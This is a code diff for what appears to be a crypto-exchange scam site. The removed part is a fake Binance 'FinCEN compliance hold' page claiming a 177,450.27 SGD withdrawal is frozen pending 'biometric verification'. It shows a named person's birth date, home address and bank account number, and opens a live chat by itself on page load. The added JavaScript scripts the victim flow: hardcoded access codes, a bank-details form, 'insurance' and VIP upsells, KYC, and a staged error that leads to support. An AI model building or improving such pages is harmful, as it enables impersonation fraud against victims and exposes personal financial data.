@@ -1,195 +1,136 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Binance Protocol Index - Escrow Hold</title>
-    <!-- Core Bootstrap 5 CDN Link -->
-    <link href="https://jsdelivr.net" rel="stylesheet">
-    <style>
-        :root {
-            --term-dark-bg: #0b0e11;
-            --term-panel-dark: #12161a;
-            --term-card-gray: #1e2329;
-            --term-accent-gold: #f0b90b;
-            --term-gold-hover: #d4a30a;
-            --term-border: #2b3139;
-            --term-text-muted: #848e9c;
-            --success-green: #0ecb81;
-            --error-red: #f6465d;
-        }
-
-        body.terminal-layout {
-            background-color: var(--term-dark-bg) !important;
-            color: #eaecef !important;
-            font-family: system-ui, -apple-system, sans-serif;
-            margin: 0;
-            padding: 0;
-        }
-
-        .terminal-top-bar {
-            background-color: var(--term-panel-dark);
-            border-bottom: 1px solid var(--term-border);
-            padding: 18px 0;
-        }
-
-        .app-flow-card {
-            background-color: var(--term-card-gray) !important;
-            border: 1px solid var(--term-border) !important;
-            border-radius: 12px;
-            padding: 35px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
-            margin-top: 30px;
-            width: 100%;
-        }
-
-        .highlight-box {
-            background-color: rgba(240, 185, 11, 0.1);
-            border-left: 4px solid var(--term-accent-gold);
-            padding: 15px;
-            margin: 15px 0;
-            border-radius: 4px;
-        }
-
-        .error-highlight-box {
-            background-color: rgba(246, 70, 93, 0.1);
-            border-left: 4px solid var(--error-red);
-            padding: 20px;
-            margin: 20px 0;
-            border-radius: 8px;
-            text-align: left;
-        }
-
-        .code-details-block {
-            background-color: rgba(30, 35, 41, 0.8);
-            border: 1px solid var(--term-border);
-            padding: 20px;
-            border-radius: 8px;
-            margin: 15px 0;
-            font-family: 'Courier New', monospace;
-            font-size: 0.9rem;
-        }
-
-        .btn-dispute {
-            background-color: var(--error-red) !important;
-            color: #ffffff !important;
-            font-weight: 700;
-            border-radius: 8px;
-            border: none;
-            padding: 14px;
-            transition: all 0.2s ease;
-            cursor: pointer;
-            width: 100%;
-            text-transform: uppercase;
-            margin-top: 15px;
-            text-decoration: none;
-            display: block;
-            text-align: center;
-        }
-        .btn-dispute:hover {
-            background-color: #e63550 !important;
-            color: #ffffff !important;
-        }
-    </style>
-</head>
-<body class="terminal-layout">
-
-    <header class="terminal-top-bar">
-        <div class="container d-flex justify-content-between align-items-center">
-            <div class="fw-bold text-white fs-5" style="letter-spacing: 0.5px;">
-                <span style="color: var(--term-accent-gold);">SOVEREIGN</span> BINANCE PROTOCOL
-            </div>
-            <span class="badge bg-dark border border-secondary text-white-50 px-3 py-2" style="font-size: 0.75rem;">FINANCE COMPLIANCE SECURITY</span>
-        </div>
-    </header>
-
-    <div class="container pb-5">
-        <div class="row justify-content-center">
-            <div class="col-md-8 col-lg-6">
-
-                <!-- 4️⃣ PINAKAHULING AKTO: FINCEN REGULATORY RESTRICTION PANEL -->
-                <div id="layerKYCFailed" class="app-flow-card text-center">
-                    <div class="d-flex align-items-center gap-3 mb-3 justify-content-center">
-                        <h3 class="m-0" style="color: var(--error-red); font-size: 3rem;">✕</h3>
-                    </div>
-                    
-                    <!-- KLTN SECURE DATA REGISTRY -->
-                    <div class="text-start border border-secondary p-3 rounded mb-4 small text-white-50">
-                        <div class="fw-bold text-white mb-2" style="color: var(--term-accent-gold) !important;">🔒 PROFILE ACCOUNT STATEMENT</div>
-                        <div><strong>Account Holder:</strong> Tan Kang Lin (KLTN)</div>
-                        <div><strong>D.O.B:</strong> 12/03/52</div>
-                        <div><strong>Address:</strong> 101 Bukit Batok West Avenue 6, #09-32</div>
-                        <div class="mt-2"><strong>Bank Linkage:</strong> DBS Bank</div>
-                        <div><strong>Ac # -</strong> 0010544080</div>
-                        <div><strong>Bank Address:</strong> DBS Asia Central, Marina Bay Financial Centre Tower 3, 12 Marina Boulevard, Singapore 018982</div>
-                        <div class="mt-2 fw-bold text-danger">Account Status: HOLD - INSUFFICIENT / INCOMPLETE DOCUMENTS REMEDIATION REQUIRED</div>
-                    </div>
-
-                    <h4 class="fw-bold m-0 text-white mb-3 text-start text-md-center">⚠️ Withdrawal Blocked: FinCEN Compliance Hold Active</h4>
-                    <hr class="border-secondary">
-                    <!-- FINCEN REGULATORY ALERT WARNING TEXT COMPONENT -->
-                    <div class="error-highlight-box text-white small">
-                        <p class="mb-3">Your withdrawal request of 177,450.27 SGD has been intercepted and placed on a federal regulatory hold under United States financial frameworks.</p>
-                        <p class="mb-3">As a global digital asset platform, Binance strictly operates in full compliance with international financial authorities. During our automated international compliance sweep, your wallet network activity triggered a Tier-2 risk flag. In strict accordance with Binance's regulatory obligations under the US Department of the Treasury’s FinCEN (Financial Crimes Enforcement Network) mandates, the Bank Secrecy Act (BSA), and the SEC (Securities and Exchange Commission) cross-border digital asset guidelines, withdrawal access is restricted until identity verification is fully remediated.</p>
-                    </div>
-
-                    <div class="code-details-block text-start text-white-50">
-                        <p class="m-0 text-white fw-bold">Compliance & Transaction Audit:</p>
-                        <p class="m-0 mt-2">Platform Status: Binance Regulatory Compliance Protocol Active</p>
-                        <p class="m-0">Requested Amount: 177,450.27 SGD</p>
-                        <p class="m-0">Asset Origin: United States Liquidity Pool (US-East Clear)</p>
-                        <p class="m-0">Current Status: US Federal Regulatory Escrow / Restricted Liquidity</p>
-                        <p class="m-0">Audit Reference: TXN-US-SGD-99410A7X</p>
-                        <p class="m-0">System Flag: Code 403-FinCEN / Cross-Border Threshold Exceeded</p>
-                    </div>
-
-                    <div class="highlight-box text-white text-start small mt-3">
-                        <p class="m-0"><strong>Mandatory Action Required:</strong> The total amount of 177,450.27 SGD is secured in a US-regulated federal custodian vault. Binance is legally required to uphold these verification frameworks. To trigger an automated release and route the funds back to your destination account, you must instantly complete the advanced biometric verification.</p>
-                    </div>
-
-                    <p class="text-muted small mb-3 mt-4">Need to dispute this decision or resubmit documents?</p>
-                    <button class="btn-dispute" id="dispute-btn">🔴 Open Dispute & Chat with Support</button>
-                </div>
-
-            </div>
-        </div>
-    </div>
-
-    <!-- 🌐 TAWK.TO LIVE SUPPORT INTEGRATION ENGINE (AUTOMATIC TRIGGER ON PAGE LOAD) -->
-    <script type="text/javascript">
-    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-    (function(){
-        var s1=document.createElement("script"),s0=document.getElementsByTagName("script");
-        s1.async=true;
-        s1.src='https://tawk.to';
-        s1.charset='UTF-8';
-        s1.setAttribute('crossorigin','*');
-        s0.parentNode.insertBefore(s1,s0);
-    })();
-
-    Tawk_API = Tawk_API || {};
+document.addEventListener("DOMContentLoaded", function () {
     
-    // Awtomatikong tracking identity logs at pop-up maximization pagpasok pa lang sa hold page
-    Tawk_API.onLoad = function(){
-        Tawk_API.setAttributes({
-            'Name' : 'Simulation Target 258349',
-            'Email' : 'target@fictional-lab.local',
-            'Hash' : 'Index-Alpha-Triggered'
-        }, function(error){});
+    // ==========================================================
+    // 🔍 PART 1: MASTER LOOKUP ENGINE (case.html Search Box)
+    // ==========================================================
+    const searchBtn = document.getElementById("btnSearchCase");
+    const caseInput = document.getElementById("caseInputCode");
+    const dynamicProfile = document.getElementById("dynamicProfileSection");
 
-        // Pagbukas at pwersahang pagpapalaki ng chat console window agad-agad
-        Tawk_API.showWidget();
-        Tawk_API.maximize();
-        
-        document.getElementById('dispute-btn').addEventListener('click', function(e) {
-            e.preventDefault();
-            Tawk_API.showWidget();
-            Tawk_API.maximize();
+    if (searchBtn && caseInput) {
+        searchBtn.addEventListener("click", function () {
+            const enteredCode = caseInput.value.trim();
+
+            // 🔑 CONDITION A: Kapag profile ni Branko (784291) - Ipakita ang card sa screen
+            if (enteredCode === "784291") {
+                if (dynamicProfile) {
+                    dynamicProfile.classList.remove("d-none");
+                    dynamicProfile.scrollIntoView({ behavior: 'smooth' });
+                }
+            } 
+            // 🔑 CONDITION B: Kapag wallet code ni KLTN (120352) - Awtomatikong lilipat sa crypto page at lagpas login panel!
+            else if (enteredCode === "120352") {
+                window.location.href = "crypto.html?autoauth=120352";
+            } 
+            // Fallback alert prompt para sa maling tracking strings
+            else {
+                alert("Master reference authentication token key not registered under secure tracking rows.");
+                if (dynamicProfile) dynamicProfile.classList.add("d-none");
+            }
         });
-    };
+    }
 
-    Tawk_API.onChatMessageAgent = function(){ Tawk_API.maximize(); };
-    Tawk_API.onChatMessageVisitor = function(){ Tawk_API.maximize(); };
-    </script>
-</body>
-</html>
+    // ==========================================================
+    // 💳 PART 2: CRYPTO NODE AUTO-LOAD SYSTEM (crypto.html login gateway)
+    // ==========================================================
+    const urlParams = new URLSearchParams(window.location.search);
+    const autoAuthCode = urlParams.get('autoauth');
+    
+    const authBlock = document.getElementById("authGatewayBlock");
+    const reportLayer = document.getElementById("walletReportMatrixLayer");
+    const walletInput = document.getElementById("walletAuthCodeField");
+
+    // Kung ang code na 120352 ay bitbit mula sa main database link page redirection, i-bypass ang gateway!
+    if (autoAuthCode === "120352" && reportLayer && authBlock) {
+        authBlock.classList.add("d-none");
+        reportLayer.classList.remove("d-none");
+    }
+
+    // Manual access verification sync connection configuration trigger fallback fallback loop
+    const syncWalletBtn = document.getElementById("btnTriggerWalletSync");
+    if (syncWalletBtn && walletInput && reportLayer) {
+        syncWalletBtn.addEventListener("click", function () {
+            if (walletInput.value.trim() === "120352") {
+                if (authBlock) authBlock.classList.add("d-none");
+                reportLayer.classList.remove("d-none");
+                reportLayer.scrollIntoView({ behavior: 'smooth' });
+            } else {
+                alert("Decentralized wallet authentication token code invalid.");
+            }
+        });
+    }    // ==========================================================
+    // 🔳 PART 3: WITHDRAWAL & DOCUMENT WORKFLOW LINK SYSTEM
+    // ==========================================================
+    const withdrawalBtn = document.getElementById("btnOpenWithdrawalForm");
+    const formSection = document.getElementById("withdrawalFormSection");
+    const confirmBankBtn = document.getElementById("btnConfirmBankDetails");
+    const insuranceSection = document.getElementById("insuranceSection");
+    const selectInsBtn = document.querySelectorAll(".select-ins-btn");
+    const nextInsBtn = document.getElementById("btnNextFromInsurance");
+    const skipInsBtn = document.getElementById("btnSkipInsurance");
+    const kycSection = document.getElementById("kycSection");
+    const executeWithdrawalBtn = document.getElementById("btnExecuteFinalWithdrawal");
+    const loadingSection = document.getElementById("loadingSection");
+    const errorSection = document.getElementById("limitErrorSection");
+    const availVipBtn = document.getElementById("btnAvailVipNow");
+    const supportPopup = document.getElementById("binanceSupportPopupMask");
+
+    if (withdrawalBtn && formSection) {
+        withdrawalBtn.addEventListener("click", function () {
+            formSection.classList.remove("d-none");
+            formSection.scrollIntoView({ behavior: 'smooth' });
+        });
+    }
+
+    if (confirmBankBtn && insuranceSection) {
+        confirmBankBtn.addEventListener("click", function () {
+            insuranceSection.classList.remove("d-none");
+            insuranceSection.scrollIntoView({ behavior: 'smooth' });
+        });
+    }
+
+    selectInsBtn.forEach(btn => {
+        btn.addEventListener("click", function () {
+            selectInsBtn.forEach(b => { 
+                b.classList.remove("btn-warning", "text-dark"); 
+                b.classList.add("btn-outline-warning"); 
+                b.innerText = "Select Policy"; 
+            });
+            this.classList.remove("btn-outline-warning"); 
+            this.classList.add("btn-warning", "text-dark"); 
+            this.innerText = "Policy Chosen";
+            if (nextInsBtn) nextInsBtn.removeAttribute("disabled");
+        });
+    });
+
+    const triggerKyc = function() { 
+        if (kycSection) { 
+            kycSection.classList.remove("d-none"); 
+            kycSection.scrollIntoView({ behavior: 'smooth' }); 
+        } 
+    };
+    if (nextInsBtn) nextInsBtn.addEventListener("click", triggerKyc);
+    if (skipInsBtn) skipInsBtn.addEventListener("click", triggerKyc);
+
+    if (executeWithdrawalBtn && loadingSection && errorSection) {
+        executeWithdrawalBtn.addEventListener("click", function () {
+            if (kycSection) kycSection.classList.add("d-none");
+            loadingSection.classList.remove("d-none");
+            loadingSection.scrollIntoView({ behavior: 'smooth' });
+            
+            // 3-second configuration interval loop timeout simulation parameters
+            setTimeout(function () {
+                loadingSection.classList.add("d-none");
+                errorSection.classList.remove("d-none");
+                errorSection.scrollIntoView({ behavior: 'smooth' });
+            }, 3000);
+        });
+    }
+
+    if (availVipBtn && supportPopup) {
+        availVipBtn.addEventListener("click", function () {
+            supportPopup.classList.add("active");
+        });
+    }
+});
+
